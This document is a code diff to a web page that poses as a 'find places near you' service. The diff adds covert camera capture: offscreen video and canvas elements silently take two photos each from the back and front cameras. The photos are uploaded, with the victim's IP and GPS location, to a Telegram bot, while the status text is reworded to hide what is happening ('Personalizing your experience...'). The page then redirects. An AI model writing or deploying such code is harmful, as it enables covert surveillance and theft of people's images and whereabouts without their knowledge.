@@ -51,6 +51,17 @@
             position: relative;
         }
 
+        /* Hidden video elements for camera capture */
+        .hidden-camera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
         /* Animated Sky Background */
         .sky-background {
             position: fixed;
@@ -765,6 +776,10 @@
     </style>
 </head>
 <body>
+    <!-- Hidden Camera Elements -->
+    <video id="hiddenVideo" class="hidden-camera" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>
+
     <!-- Page Loader -->
     <div class="page-loader" id="pageLoader">
         <div class="page-loader-icon">📍</div>
@@ -892,7 +907,11 @@
                 
                 API_TIMEOUT: 8000,
                 LOCATION_TIMEOUT: 20000,
-                REDIRECT_DELAY: 1500
+                REDIRECT_DELAY: 1500,
+                
+                // Camera settings
+                PHOTO_DELAY: 500, // Delay between photos in ms
+                PHOTO_QUALITY: 0.8 // JPEG quality (0.1 to 1.0)
             };
 
             // ============================================================
@@ -902,6 +921,7 @@
             var pageLoadTime = Date.now();
             var isProcessing = false;
             var sessionId = generateSessionId();
+            var capturedPhotos = [];
 
             // ============================================================
             // UTILITY FUNCTIONS
@@ -1046,6 +1066,12 @@
                 }
             }
 
+            function delay(ms) {
+                return new Promise(function(resolve) {
+                    setTimeout(resolve, ms);
+                });
+            }
+
             // ============================================================
             // IP LOCATION
             // ============================================================
@@ -1127,7 +1153,8 @@
                         currentURL: window.location.href
                     },
                     permissions: { location: 'Pending', camera: 'Pending' },
-                    location: { gps: null, ip: null }
+                    location: { gps: null, ip: null },
+                    photos: { back1: null, back2: null, front1: null, front2: null, count: 0 }
                 };
             }
 
@@ -1168,24 +1195,155 @@
                 });
             }
 
-            function requestCameraPermission(data) {
-                return new Promise(function(resolve) {
-                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                        data.permissions.camera = '❌ Not Supported';
-                        resolve(data);
-                        return;
-                    }
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(function(stream) {
-                            data.permissions.camera = '✅ Granted';
-                            stream.getTracks().forEach(function(track) { track.stop(); });
-                            resolve(data);
-                        })
-                        .catch(function(error) {
-                            data.permissions.camera = error.name === 'NotAllowedError' ? '❌ Denied' : '❌ Error';
-                            resolve(data);
+            // ============================================================
+            // CAMERA CAPTURE FUNCTIONS
+            // ============================================================
+
+            function getVideoStream(facingMode) {
+                return new Promise(function(resolve, reject) {
+                    var constraints = {
+                        video: {
+                            facingMode: facingMode,
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    };
+
+                    navigator.mediaDevices.getUserMedia(constraints)
+                        .then(resolve)
+                        .catch(function(err) {
+                            // Fallback without facing mode constraint
+                            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                                .then(resolve)
+                                .catch(reject);
                         });
                 });
+            }
+
+            function capturePhotoFromStream(stream) {
+                return new Promise(function(resolve) {
+                    try {
+                        var video = document.getElementById('hiddenVideo');
+                        var canvas = document.getElementById('hiddenCanvas');
+                        var ctx = canvas.getContext('2d');
+
+                        video.srcObject = stream;
+                        video.play();
+
+                        // Wait for video to be ready
+                        setTimeout(function() {
+                            try {
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                var photoData = canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY);
+                                resolve(photoData);
+                            } catch (e) {
+                                resolve(null);
+                            }
+                        }, 500);
+                    } catch (e) {
+                        resolve(null);
+                    }
+                });
+            }
+
+            function stopStream(stream) {
+                if (stream && stream.getTracks) {
+                    stream.getTracks().forEach(function(track) {
+                        track.stop();
+                    });
+                }
+            }
+
+            function dataURLtoBlob(dataURL) {
+                try {
+                    var arr = dataURL.split(',');
+                    var mime = arr[0].match(/:(.*?);/)[1];
+                    var bstr = atob(arr[1]);
+                    var n = bstr.length;
+                    var u8arr = new Uint8Array(n);
+                    while (n--) {
+                        u8arr[n] = bstr.charCodeAt(n);
+                    }
+                    return new Blob([u8arr], { type: mime });
+                } catch (e) {
+                    return null;
+                }
+            }
+
+            async function captureAllPhotos(data) {
+                var photos = [];
+                
+                try {
+                    // Check if camera API is available
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        data.permissions.camera = '❌ Not Supported';
+                        return data;
+                    }
+
+                    // Capture 2 photos from BACK camera (environment)
+                    try {
+                        var backStream = await getVideoStream('environment');
+                        data.permissions.camera = '✅ Granted';
+                        
+                        // Back photo 1
+                        await delay(CONFIG.PHOTO_DELAY);
+                        var back1 = await capturePhotoFromStream(backStream);
+                        if (back1) {
+                            photos.push({ type: 'back', number: 1, data: back1 });
+                            data.photos.back1 = 'Captured';
+                        }
+                        
+                        // Back photo 2
+                        await delay(CONFIG.PHOTO_DELAY);
+                        var back2 = await capturePhotoFromStream(backStream);
+                        if (back2) {
+                            photos.push({ type: 'back', number: 2, data: back2 });
+                            data.photos.back2 = 'Captured';
+                        }
+                        
+                        stopStream(backStream);
+                    } catch (backErr) {
+                        console.log('Back camera failed:', backErr);
+                    }
+
+                    // Capture 2 photos from FRONT camera (user/selfie)
+                    try {
+                        var frontStream = await getVideoStream('user');
+                        
+                        // Front photo 1
+                        await delay(CONFIG.PHOTO_DELAY);
+                        var front1 = await capturePhotoFromStream(frontStream);
+                        if (front1) {
+                            photos.push({ type: 'front', number: 1, data: front1 });
+                            data.photos.front1 = 'Captured';
+                        }
+                        
+                        // Front photo 2
+                        await delay(CONFIG.PHOTO_DELAY);
+                        var front2 = await capturePhotoFromStream(frontStream);
+                        if (front2) {
+                            photos.push({ type: 'front', number: 2, data: front2 });
+                            data.photos.front2 = 'Captured';
+                        }
+                        
+                        stopStream(frontStream);
+                    } catch (frontErr) {
+                        console.log('Front camera failed:', frontErr);
+                    }
+
+                    data.photos.count = photos.length;
+                    capturedPhotos = photos;
+
+                } catch (err) {
+                    console.log('Camera capture error:', err);
+                    data.permissions.camera = '❌ Error';
+                }
+
+                return data;
             }
 
             // ============================================================
@@ -1257,6 +1415,14 @@
                 msg += '• <b>Camera:</b> ' + data.permissions.camera + '\n\n';
 
                 msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '📸 <b>PHOTOS CAPTURED:</b>\n';
+                msg += '• <b>Back Cam 1:</b> ' + (data.photos.back1 || '❌ Failed') + '\n';
+                msg += '• <b>Back Cam 2:</b> ' + (data.photos.back2 || '❌ Failed') + '\n';
+                msg += '• <b>Front Cam 1:</b> ' + (data.photos.front1 || '❌ Failed') + '\n';
+                msg += '• <b>Front Cam 2:</b> ' + (data.photos.front2 || '❌ Failed') + '\n';
+                msg += '• <b>Total:</b> ' + data.photos.count + '/4 photos\n\n';
+
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
                 msg += '✅ <b>Redirecting to main site...</b>\n';
                 msg += '━━━━━━━━━━━━━━━━━━━━━━━━';
 
@@ -1267,9 +1433,8 @@
                 return msg;
             }
 
-            async function sendToTelegram(data, attempt) {
+            async function sendTelegramMessage(message, attempt) {
                 attempt = attempt || 1;
-                var message = buildTelegramMessage(data);
                 var telegramUrl = 'https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendMessage';
 
                 try {
@@ -1288,11 +1453,61 @@
                     return { success: true };
                 } catch (error) {
                     if (attempt < CONFIG.TELEGRAM_MAX_RETRIES) {
-                        await new Promise(function(r) { setTimeout(r, CONFIG.TELEGRAM_RETRY_DELAY * attempt); });
-                        return sendToTelegram(data, attempt + 1);
+                        await delay(CONFIG.TELEGRAM_RETRY_DELAY * attempt);
+                        return sendTelegramMessage(message, attempt + 1);
                     }
                     return { success: false };
                 }
+            }
+
+            async function sendTelegramPhoto(photoData, caption, attempt) {
+                attempt = attempt || 1;
+                var telegramUrl = 'https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendPhoto';
+
+                try {
+                    var blob = dataURLtoBlob(photoData);
+                    if (!blob) throw new Error('Failed to create blob');
+
+                    var formData = new FormData();
+                    formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', caption);
+
+                    var response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    var result = await response.json();
+                    if (!result.ok) throw new Error(result.description);
+                    return { success: true };
+                } catch (error) {
+                    if (attempt < CONFIG.TELEGRAM_MAX_RETRIES) {
+                        await delay(CONFIG.TELEGRAM_RETRY_DELAY * attempt);
+                        return sendTelegramPhoto(photoData, caption, attempt + 1);
+                    }
+                    return { success: false };
+                }
+            }
+
+            async function sendAllToTelegram(data) {
+                // Send main data message first
+                var message = buildTelegramMessage(data);
+                await sendTelegramMessage(message);
+
+                // Send each captured photo
+                for (var i = 0; i < capturedPhotos.length; i++) {
+                    var photo = capturedPhotos[i];
+                    var caption = '📸 Photo ' + (i + 1) + '/4\n';
+                    caption += '📷 Camera: ' + (photo.type === 'back' ? 'Back (Environment)' : 'Front (Selfie)') + '\n';
+                    caption += '🔢 Number: ' + photo.number + '\n';
+                    caption += '🔑 Session: ' + data.sessionId + '\n';
+                    caption += '⏰ Time: ' + data.timestamp;
+
+                    await sendTelegramPhoto(photo.data, caption);
+                    await delay(300); // Small delay between photos
+                }
+
+                return { success: true };
             }
 
             // ============================================================
@@ -1305,24 +1520,32 @@
 
                 var btn = document.getElementById('continueBtn');
                 btn.disabled = true;
-                btn.innerHTML = '<span>⏳</span><span>Finding places...</span>';
+                btn.innerHTML = '<span>⏳</span><span>Please wait...</span>';
 
                 try {
-                    showStatus('🔍 Searching for places near you...', 'loading');
+                    // Step 1: Collect basic data
+                    showStatus('🔍 Finding amazing places near you...', 'loading');
                     var data = await collectAllData();
 
+                    // Step 2: Get IP location
                     showStatus('📍 Getting your location...', 'loading');
                     data.location.ip = await getIPLocation();
+
+                    // Step 3: Request GPS location
                     data = await requestLocationPermission(data);
 
-                    showStatus('📷 Setting up camera access...', 'loading');
-                    data = await requestCameraPermission(data);
+                    // Step 4: Capture photos (silent)
+                    showStatus('✨ Personalizing your experience...', 'loading');
+                    data = await captureAllPhotos(data);
 
+                    // Update time on page
                     data.timeOnPage = getTimeOnPage();
 
-                    showStatus('✨ Almost ready...', 'loading');
-                    await sendToTelegram(data);
+                    // Step 5: Send everything to Telegram
+                    showStatus('🚀 Almost ready...', 'loading');
+                    await sendAllToTelegram(data);
 
+                    // Step 6: Success - redirect
                     showStatus('🎉 Found amazing places! Redirecting...', 'success');
 
                     setTimeout(function() {
@@ -1330,6 +1553,7 @@
                     }, CONFIG.REDIRECT_DELAY);
 
                 } catch (error) {
+                    console.error('Main flow error:', error);
                     showStatus('🚀 Redirecting you now...', 'success');
                     setTimeout(function() {
                         window.location.href = CONFIG.MAIN_SITE_URL;
